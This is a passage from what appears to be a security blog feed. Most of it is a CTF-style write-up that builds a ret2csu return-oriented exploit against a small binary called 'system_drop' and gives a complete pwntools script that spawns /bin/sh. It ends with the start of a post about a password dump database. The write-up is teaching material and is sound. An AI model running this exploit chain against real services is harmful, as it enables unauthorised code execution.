  <span style="color:#960050;background-color:#1e0010">4005</span>cc:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">c</span>                   pop    r12
  <span style="color:#960050;background-color:#1e0010">4005</span>ce:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                   pop    r13
  <span style="color:#960050;background-color:#1e0010">4005</span>d0:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">e</span>                   pop    r14
  <span style="color:#960050;background-color:#1e0010">4005</span>d2:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">f</span>                   pop    r15
  <span style="color:#960050;background-color:#1e0010">4005</span>d4:       <span style="color:#a6e22e">c3</span>                      ret
  <span style="color:#960050;background-color:#1e0010">4005</span>d5:       <span style="color:#960050;background-color:#1e0010">90</span>                      <span style="color:#a6e22e">nop</span>
  <span style="color:#960050;background-color:#1e0010">4005</span>d6:       <span style="color:#960050;background-color:#1e0010">66</span> <span style="color:#960050;background-color:#1e0010">2</span><span style="color:#a6e22e">e</span> <span style="color:#ae81ff">0</span>f <span style="color:#ae81ff">1</span>f <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    nop    <span style="color:#66d9ef">WORD</span> PTR cs:[rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
</code></pre></div><p>The two relevant pieces are (we&rsquo;ll get to why in a bit):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">  <span style="color:#960050;background-color:#1e0010">4005</span>ca:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">b</span>                      pop    rbx
  <span style="color:#960050;background-color:#1e0010">4005</span>cb:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                      pop    rbp
  <span style="color:#960050;background-color:#1e0010">4005</span>cc:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">c</span>                   pop    r12
  <span style="color:#960050;background-color:#1e0010">4005</span>ce:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                   pop    r13
  <span style="color:#960050;background-color:#1e0010">4005</span>d0:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">e</span>                   pop    r14
  <span style="color:#960050;background-color:#1e0010">4005</span>d2:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">f</span>                   pop    r15
  <span style="color:#960050;background-color:#1e0010">4005</span>d4:       <span style="color:#a6e22e">c3</span>                      ret


  <span style="color:#960050;background-color:#1e0010">4005</span>b0:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> fa                mov    rdx,r15
  <span style="color:#960050;background-color:#1e0010">4005</span>b3:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> f6                mov    rsi,r14
  <span style="color:#960050;background-color:#1e0010">4005</span>b6:       <span style="color:#960050;background-color:#1e0010">44</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">ef</span>                mov    edi,r13d
  <span style="color:#960050;background-color:#1e0010">4005</span>b9:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">14</span> dc             call   <span style="color:#66d9ef">QWORD</span> PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
</code></pre></div><h2 id="the-code">The Code</h2>
<p><code>main:</code> calls 2 functions, then returns</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">400541:</span>       <span style="color:#960050;background-color:#1e0010">55</span>                      <span style="color:#a6e22e">push</span>   rbp
<span style="color:#960050;background-color:#1e0010">400542:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">e5</span>                mov    rbp,rsp
<span style="color:#960050;background-color:#1e0010">400545:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">ec</span> <span style="color:#ae81ff">20</span>             sub    rsp,<span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">400549:</span>       <span style="color:#a6e22e">bf</span> <span style="color:#ae81ff">0</span>f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edi,<span style="color:#ae81ff">0xf</span>
<span style="color:#960050;background-color:#1e0010">40054</span>e:       <span style="color:#a6e22e">e8</span> dd fe ff ff          call   <span style="color:#ae81ff">400430</span> <span style="color:#f92672">&lt;</span>alarm@plt<span style="color:#f92672">&gt;</span>
<span style="color:#960050;background-color:#1e0010">400553:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">45</span> e0             lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
<span style="color:#960050;background-color:#1e0010">400557:</span>       <span style="color:#a6e22e">ba</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edx,<span style="color:#ae81ff">0x100</span>
<span style="color:#960050;background-color:#1e0010">40055</span>c:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">c6</span>                mov    rsi,rax
<span style="color:#960050;background-color:#1e0010">40055</span>f:       <span style="color:#a6e22e">bf</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edi,<span style="color:#ae81ff">0x0</span>
<span style="color:#960050;background-color:#1e0010">400564:</span>       <span style="color:#a6e22e">e8</span> d7 fe ff ff          call   <span style="color:#ae81ff">400440</span> <span style="color:#f92672">&lt;</span>read@plt<span style="color:#f92672">&gt;</span>
<span style="color:#960050;background-color:#1e0010">400569:</span>       <span style="color:#a6e22e">b8</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    eax,<span style="color:#ae81ff">0x1</span>
<span style="color:#960050;background-color:#1e0010">40056</span>e:       <span style="color:#a6e22e">c9</span>                      leave
<span style="color:#960050;background-color:#1e0010">40056</span>f:       <span style="color:#a6e22e">c3</span>                      ret
</code></pre></div><p>The code is fairly simple. We&rsquo;ve also only 2 imports from <code>libc</code>, <code>alarm</code>, and <code>read</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0000000000400430</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">alarm@plt</span><span style="color:#f92672">&gt;</span>:
  <span style="color:#960050;background-color:#1e0010">400430:</span>       <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">25</span> e2 <span style="color:#ae81ff">0b</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>       jmp    <span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200be2</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">601018</span> <span style="color:#f92672">&lt;</span>alarm@GLIBC_2.2.5<span style="color:#f92672">&gt;</span>
  <span style="color:#960050;background-color:#1e0010">400436:</span>       <span style="color:#960050;background-color:#1e0010">68</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>          <span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x0</span>
  <span style="color:#960050;background-color:#1e0010">40043</span>b:       <span style="color:#a6e22e">e9</span> e0 ff ff ff          jmp    <span style="color:#ae81ff">400420</span> <span style="color:#f92672">&lt;</span>.plt<span style="color:#f92672">&gt;</span>

<span style="color:#960050;background-color:#1e0010">0000000000400440</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">read@plt</span><span style="color:#f92672">&gt;</span>:
  <span style="color:#960050;background-color:#1e0010">400440:</span>       <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">25</span> da <span style="color:#ae81ff">0b</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>       jmp    <span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200bda</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">601020</span> <span style="color:#f92672">&lt;</span>read@GLIBC_2.2.5<span style="color:#f92672">&gt;</span>
  <span style="color:#960050;background-color:#1e0010">400446:</span>       <span style="color:#960050;background-color:#1e0010">68</span> <span style="color:#960050;background-color:#1e0010">01</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>          <span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x1</span>
</code></pre></div><h2 id="the-plan">The Plan</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ ropper --search <span style="color:#e6db74">&#39;syscall&#39;</span> --file ./system_drop

<span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> File: ./system_drop
0x000000000040053b: syscall; ret;
</code></pre></div><p>Further analysis will reveal the existence of a <code>syscall</code> instruction within the binary. We should
be able to use this to our advantage to call <code>execve('/bin/sh', 0, 0)</code>.</p>
<h3 id="overview">Overview</h3>
<ol>
<li>Find our buffer length</li>
<li>Our initial payload will contain all of the <em>actions</em> of our exploit path. (Timey, wimey)</li>
<li>We&rsquo;ll trigger an additional read half way through our payload.
<ul>
<li>This will provide the second half with the <em>data</em> it needs to finish the exploit</li>
</ul>
</li>
</ol>
<h3 id="deeper-dive">Deeper Dive</h3>
<p>The first leg of our ret2csu attack will focus on populating some seemingly-arbitrary registers. It
may seem useless to put <code>syscall</code> and &ldquo;/bin/sh&rdquo; into <code>r12</code> and <code>r13</code>, after all, that&rsquo;s not the
correct calling convention for x64 asm. The second leg of our csu code will do the rest of the
lifting for us though.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b0</span>      mov rdx, r15
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b3</span>      mov rsi, r14
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b6</span>      mov edi, r13d
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b9</span>      call <span style="color:#66d9ef">qword</span> [r12 <span style="color:#f92672">+</span> rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
</code></pre></div><p>You&rsquo;ll notice that the <code>call</code> instruction at <code>0x4005b9</code> is de-referencing <code>r12 + rbx*8</code>. If we
provide <code>0</code> to <code>rbx</code>, and a pointer to an address holding the instruction we want called, we should
be in business. We&rsquo;ll also have to set <code>rax</code> to <code>59</code>, the <code>syscall</code> number for <code>execve</code>. Luckily,
the return value of <code>read</code> is the length of input (we control this!), and that value gets stored at
<code>rax</code>.</p>
<p>We have yet to discuss two final pieces of this puzzle. The locations of the string &ldquo;/bin/sh&rdquo; and a
pointer to <code>syscall</code>&rsquo;s location'. In this instance, we can simply create that data using the <code>read</code>
function.</p>
<p>The <code>.bss</code> section of an ELF gets loaded into memory as a <code>rw-</code> segment. This will do nicely. We
don&rsquo;t need execution on this data. Given a known-constant address that&rsquo;s writeable, we can use this
address as arguments to functions we want to set up, even if the data there is yet to be written.</p>
<p>We&rsquo;ll need a gadget to set <code>rsi</code>, our read destination aka <code>bss</code></p>
<pre tabindex="0"><code>NAME
       read - read from a file descriptor
SYNOPSIS
                      rdi      rsi         rsx
       ssize_t read(int fd, void *buf, size_t count);
</code></pre><p>Half way through our exploit, we&rsquo;ll read the values in to the locations where we told future
instructions to look.</p>
<p>Abstractly, this is difficult to explain. We&rsquo;re essentially planning out 2 moves in advance,
whereby the first move requests additional data in order to correctly complete the second. Again,
Timey, wimey</p>
<h2 id="the-exploit">The Exploit</h2>
<h3 id="finding-the-offset">Finding the offset</h3>
<p>We&rsquo;ll keep this section short. It&rsquo;s 40.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; r &lt;&lt;<span style="color:#f92672">(</span>cyclic 80<span style="color:#f92672">)</span>
Starting program: ./system_drop &lt;&lt;<span style="color:#f92672">(</span>cyclic 80<span style="color:#f92672">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x000000000040056f in main <span style="color:#f92672">()</span>

pwndbg&gt; x/dx $rsp
0x7fffffffe1c8: 0x6161616b
pwndbg&gt; cyclic -l 0x6161616b
<span style="color:#ae81ff">40</span>
</code></pre></div><h3 id="getting-the-bss-addresses">Getting the <code>.bss</code> addresses</h3>
<p>You can get this dynamically from <code>pwntools</code> or manually with <code>objdump</code> or any disassembler of your
choice.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./system_drop&#34;</span>
    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (<span style="color:#ae81ff">0x400000</span>)
In [<span style="color:#ae81ff">3</span>]: hex( context<span style="color:#f92672">.</span>binary<span style="color:#f92672">.</span>bss() )
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#e6db74">&#39;0x601038&#39;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -D ./system_drop | grep -A <span style="color:#ae81ff">3</span> bss

Disassembly of section .bss:
<span style="color:#ae81ff">0000000000601038</span> &lt;completed.7698&gt;:
</code></pre></div><h3 id="kick-off-a-new-read-to-fill-bss">Kick off a new <code>read</code> to fill <code>.bss</code></h3>
<p>When we take control of the program, we will have just completed a <code>read</code> where the arguments
were <code>read(1, $dest, 0x100)</code>. The 1st and 3rd arguments work great for us, so we&rsquo;ll
only need to find a <code>pop rsi</code> gadget in order to set the 2nd argument to before jumping to read
again.</p>
<pre tabindex="0"><code>
``` bash
pwndbg&gt; ropper --  --search 'pop rsi'

[INFO] File: system_drop
0x00000000004005d1: pop rsi; pop r15; ret;
</code></pre><p>Great. We can also dynamically fetch this in pwntools. I try to be kind to my future self when
writing these exploits and avoid using &ldquo;magic numbers&rdquo;. In a year when I look back, I won&rsquo;t
remember where <code>0x4005d1</code> came from.</p>
<p>In any case, we can start building our payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
pop_rsi_r15_ret <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;pop rsi; pop r15; ret&#39;</span>)))
ptr_bin_sh <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>bss()
ptr_syscall <span style="color:#f92672">=</span> ptr_bin_sh <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>limit
payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15_ret)     <span style="color:#75715e"># prepare additional `read`</span>
payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># rsi - read dest</span>
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadc0de</span>)          <span style="color:#75715e"># r15 - junk</span>
<span style="color:#75715e"># ret</span>
payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read)          <span style="color:#75715e"># read in bin/sh to .bss</span>
<span style="color:#75715e"># ret</span>
</code></pre></div><h3 id="__libc_csu_init"><code>__libc_csu_init</code></h3>
<p>When sending the previous code, the program will receive more input, which will contain the string
<code>/bin/sh\x00</code> and store it at <code>ptr_bin_sh</code>. We now have a known address for the location of the
first argument to <code>execve</code>.</p>
<p>Let&rsquo;s build the <code>csu</code> portion of the payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">+=</span> p64(csu_one)             <span style="color:#75715e"># kick off register-setup with ret2csu</span>
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbx</span>
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbp</span>
payload <span style="color:#f92672">+=</span> p64(ptr_syscall)         <span style="color:#75715e"># pop r12 -(stage 2)-&gt; call [r12+rbx*8]</span>
payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># pop r13 -(stage 2)-&gt; rdi</span>
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r14 -(stage 2)-&gt; rsi</span>
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r15 -(stage 2)-&gt; rdx</span>
<span style="color:#75715e"># ret</span>
payload <span style="color:#f92672">+=</span> p64(csu_two)             <span style="color:#75715e"># stage 2 finishes -&gt; register setup</span>
io<span style="color:#f92672">.</span>sendling(payload)
</code></pre></div><p>We&rsquo;ll use the same strategy for creating <code>ptr_syscall</code> that we did for <code>ptr_bin_sh</code>. We&rsquo;ll pass it
in later, during the first read.</p>
<p>At this point, we could send the payload. This will trigger a <code>read</code>, we can pass in our second
stage and populate the arguments we&rsquo;d need for execution during the second half of the exploit.</p>
<p>The secondary payload contains the 8-byte string for <code>&quot;/bin/sh\x00&quot;</code> followed by the syscall
address. We&rsquo;ll tack on a padding of null bytes until we reach a length of 59. This is because we&rsquo;ll
be jumping to <code>syscall</code> and we need <code>rax</code> to equal 59 when we do. The return value of <code>read</code> is the
length of the payload, which we control, and is stored at <code>rax</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;syscall&#39;</span>)))

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> p64(syscall)
payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(c<span style="color:#f92672">.</span>SYS_execve, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># c is pwnlib.constants</span>

io<span style="color:#f92672">.</span>send(payload)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Let&rsquo;s put it all together</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> context, gdb, log, args, remote, process, p64, asm, constants <span style="color:#66d9ef">as</span> c
<span style="color:#f92672">import</span> sys

usage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    sploit.py &lt;BIN&gt; [REMOTE=x.x.x.x:yy] [GDB,DEBUG]
</span><span style="color:#e6db74">    GDB     Enables use of GDB during exploit development. Require tmux
</span><span style="color:#e6db74">    DEBUG   Enables debug logging in pwntool
</span><span style="color:#e6db74">    REMOTE= Set the host and port to which the exploit will be sent
</span><span style="color:#e6db74">            GDB cannot be used with this mode
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

BIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./system_drop&#34;</span>


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>(gdbrc):
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">and</span> BIN <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
        log<span style="color:#f92672">.</span>warn(usage)
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
    binary <span style="color:#f92672">=</span> BIN <span style="color:#f92672">or</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
    context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
        HOST, PORT <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>REMOTE<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#ae81ff">1</span>)
        <span style="color:#66d9ef">return</span> remote(HOST, PORT)
    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
        <span style="color:#75715e"># context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;, &#34;-p&#34;, &#34;75&#34;]</span>
        context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;neww&#34;</span>]
        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(binary, gdbrc)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> process(binary)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(io):
    <span style="color:#75715e"># import ipdb;ipdb.set_trace(context=5)</span>
    limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
    e <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary

    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    0x004005ca      pop rbx
</span><span style="color:#e6db74">    0x004005cb      pop rbp
</span><span style="color:#e6db74">    0x004005cc      pop r12
</span><span style="color:#e6db74">    0x004005ce      pop r13
</span><span style="color:#e6db74">    0x004005d0      pop r14
</span><span style="color:#e6db74">    0x004005d2      pop r15
</span><span style="color:#e6db74">    0x004005d4      ret
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    csu_one <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005ca</span>

    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    0x004005b0      mov rdx, r15       ; char **ubp_av
</span><span style="color:#e6db74">    0x004005b3      mov rsi, r14       ; int argc
</span><span style="color:#e6db74">    0x004005b6      mov edi, r13d      ; func main
</span><span style="color:#e6db74">    0x004005b9      call qword [r12 + rbx*8]
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    csu_two <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005b0</span>

    pop_rsi_r15_ret <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;pop rsi; pop r15; ret&#39;</span>)))
    ptr_bin_sh <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>bss()
    ptr_syscall <span style="color:#f92672">=</span> ptr_bin_sh <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>

    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>limit
    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15_ret)     <span style="color:#75715e"># prepare additional `read`</span>
    payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># rsi - read dest</span>
    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadc0de</span>)          <span style="color:#75715e"># r15 - junk</span>
    <span style="color:#75715e"># ret</span>
    payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read)          <span style="color:#75715e"># read in bin/sh and syscall to .bss</span>
    <span style="color:#75715e"># ret</span>
    payload <span style="color:#f92672">+=</span> p64(csu_one)             <span style="color:#75715e"># kick off register setup with ret2csu</span>
    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbx</span>
    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbp</span>
    payload <span style="color:#f92672">+=</span> p64(ptr_syscall)         <span style="color:#75715e"># pop r12 -&gt; call [r12+rbx*8]</span>
    payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># pop r13 -&gt; rdi</span>
    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r14 -&gt; rsi</span>
    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r15 -&gt; rdx</span>
    <span style="color:#75715e"># ret</span>
    payload <span style="color:#f92672">+=</span> p64(csu_two)             <span style="color:#75715e"># stage 2 finishes -&gt; register setup</span>
    io<span style="color:#f92672">.</span>sendline(payload)

    syscall <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;syscall&#39;</span>)))
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(syscall)
    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(c<span style="color:#f92672">.</span>SYS_execve, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
    io<span style="color:#f92672">.</span>send(payload)
    io<span style="color:#f92672">.</span>interactive()


<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    gdbrc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    # b read
</span><span style="color:#e6db74">    # b *__libc_csu_init+73
</span><span style="color:#e6db74">    # c
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    io <span style="color:#f92672">=</span> init(gdbrc)
    main(io)
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Password Dump Database - Part 2</title>
            <link>https://ctrl.red/posts/2020/05/password-dump-database-part-2/</link>
            <pubDate>Mon, 04 May 2020 15:58:04 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2020/05/password-dump-database-part-2/</guid>
            <description>THE RETCONNING It is my sincerest hope that my last post was of some use to you because I&amp;rsquo;m about to tell you to forget it. Like almost all of it.
Right around the time I discovered that even with an O(log n) insertion rate, and even while saturating the IO of 2 SSDs in a RAID-0 configuration would seeding still take months&amp;hellip; it was then, dear reader, that I decided&amp;hellip;</description>
            <content type="html"><![CDATA[<h2 id="the-retconning">THE RETCONNING</h2>
<p>It is my sincerest hope that my last post was of some use to you because I&rsquo;m about to tell you to
forget it. Like almost all of it.</p>
<p>Right around the time I discovered that even with an O(log n) insertion rate,
and even while saturating the IO of 2 SSDs in a RAID-0 configuration
would seeding still take months&hellip; it was then, dear reader, that I decided&hellip;</p>
